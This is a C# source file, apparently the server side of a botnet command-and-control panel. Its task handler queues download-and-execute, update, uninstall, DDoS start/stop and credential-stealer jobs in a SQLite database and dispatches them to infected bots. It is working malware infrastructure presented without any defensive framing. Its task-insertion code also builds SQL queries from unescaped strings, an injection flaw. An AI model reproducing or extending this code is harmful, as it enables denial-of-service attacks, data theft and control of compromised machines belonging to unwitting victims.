using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Data;
using System.Data.SQLite;
using Server.Core.Config;

namespace Server.Core.Handlers
{
    enum BOT_TASK : int
    {
        DOWNLOAD_EXECUTE = 0,
        UPDATE = 1,
        UNINSTALL = 2,
        START_DDOS = 3,
        STOP_DDOS = 4,
        STEALER = 5
    }

    /*class CTask
    {
        public Int32 Task_ID { get; set; }

        public BOT_TASK Task { get; set; }

        public String Task_Parameters { get; set; }

        public Int32 Executes { get; set; }
        
        public List<Int32> ExecutedBy { get; set; }

        public Int32 Executed_OK { get; set; }
    }*/

    /// <summary>
    /// Responsible for Transmitting Tasks to Bots.
    /// </summary>
    class CTaskHandler
    {
        #region VARIABLES
        //public List<CTask> lstTask = null;
        private CBotHandler BotHandler = null;
        #endregion

        #region CONSTRUCTOR
        public CTaskHandler(CBotHandler BotHandler)
        {
            //this.lstTask = new List<CTask>();
            this.BotHandler = BotHandler;
        }
        #endregion

        #region ADD_TASK
        /// <summary>
        /// ToDo
        /// </summary>
        /// <returns></returns>
        public Boolean Add(BOT_TASK Task, String strArguments, Int32 iExecutes)
        {
            try
            {
                return CMain.DatabaseClient.ExecuteNonResultQuery(
                    string.Format("INSERT INTO tasks(task, task_parameters, task_executes, task_executed, task_executed_ok) VALUES({0}, '{1}', {2}, 0, 0)",
                    (Int32)Task, strArguments, iExecutes)
                    );
            }
            catch
            {

            }
            return false;
        }
        #endregion

        #region REMOVE_TASK
        public bool Remove(Int32 iTaskID)
        {
            try
            {
                if (CMain.DatabaseClient.ExecuteNonResultQuery(
                    string.Format(
                       "DELETE FROM tasks WHERE task_id={0}",
                       iTaskID)))
                {
                    return (CMain.DatabaseClient.ExecuteNonResultQuery(
                        string.Format(
                        "DELETE FROM tasks_executed WHERE task_id={0}",
                        iTaskID)));
                }
            }
            catch
            {

            }
            return false;
        }
        #endregion

        #region GET_TOTAL
        public int GetTotal()
        {
            return CMain.DatabaseClient.ExecuteCountQuery("SELECT COUNT(*) FROM tasks");
        }
        #endregion

        #region GET_PAGE_COUNT
        public Int32 GetPageCount()
        {
            try
            {
                decimal iCount = (decimal)this.GetTotal() / CConfig.ResultsPerPage;
                return (int)Math.Ceiling(iCount);
            }
            catch { }
            return 0;
        }
        #endregion

        #region GET_TASK_LIST
        public String GetTasklist()
        {
            try
            {
                String strQuery = "SELECT * FROM tasks";

                SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery(strQuery);

                if(Result.HasRows)
                {
                    StringBuilder sbTasklist = new StringBuilder();

                    while (Result.Read())
                    {
                        try
                        {
                            Int32 iCurrentTask = -1;

                            if (!Int32.TryParse(Result["task"].ToString(), out iCurrentTask)) continue;

                            sbTasklist.AppendFormat("{0}*{1}*{2}*{3}*{4}*{5};",
                                Result["task_id"].ToString(), iCurrentTask, Result["task_parameters"].ToString(), Result["task_executes"].ToString(), Result["task_executed"].ToString(), Result["task_executed_ok"].ToString());

                        }
                        catch
                        {

                        }
                    }

                    return sbTasklist.ToString();
                }
            }
            catch
            {
            	
            }
            return String.Empty;
        }
        #endregion

        public void SetTaskExecuted(CBot Bot, int iTaskID)
        {
            CMain.DatabaseClient.ExecuteNonResultQuery(
                string.Format(
                "UPDATE tasks SET task_executed_ok=task_executed_ok + 1 WHERE task_id={0}",
                iTaskID)
                );
        }

        bool IsTaskExecuted(CBot Bot, int iTaskID)
        {
            try
            {
                return CMain.DatabaseClient.ExecuteCountQuery(
                    string.Format(
                    "SELECT COUNT(*) FROM tasks_executed WHERE task_id={0} and bot_id={1}",
                    iTaskID, Bot.BotID)
                    ) > 0;
            }
            catch { }

            return false;
        }

        public string GetNext(CBot Bot)
        {
            try
            {
                SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery(
                    "SELECT task_id, task, task_parameters FROM tasks WHERE task_executes > task_executed"
                    );

                if (Result.HasRows)
                {
                    while (Result.Read())
                    {
                        int iTaskID = -1;

                        if (!int.TryParse(Result[0].ToString(), out iTaskID)) continue;

                        if (this.IsTaskExecuted(Bot, iTaskID)) continue;

                        int iTask = -1;

                        if (!CMain.DatabaseClient.ExecuteNonResultQuery(
                            string.Format(
                            "UPDATE tasks SET task_executed=task_executed + 1 WHERE task_id={0}",
                            iTaskID)
                            )) continue;

                        if (!CMain.DatabaseClient.ExecuteNonResultQuery(
                            string.Format(
                            "INSERT INTO tasks_executed(task_id, bot_id) VALUES({0}, {1})",
                            iTaskID, Bot.BotID)
                            )) continue;

                        if (!int.TryParse(Result[1].ToString(), out iTask)) continue;

                        string strParameters = Result[2].ToString();

                        return string.Format(
                            "{0}|{1}|{2}",
                            iTaskID, iTask, strParameters
                            );
                    }
                }
            }
            catch { }
            return string.Empty;
        }

    }
}
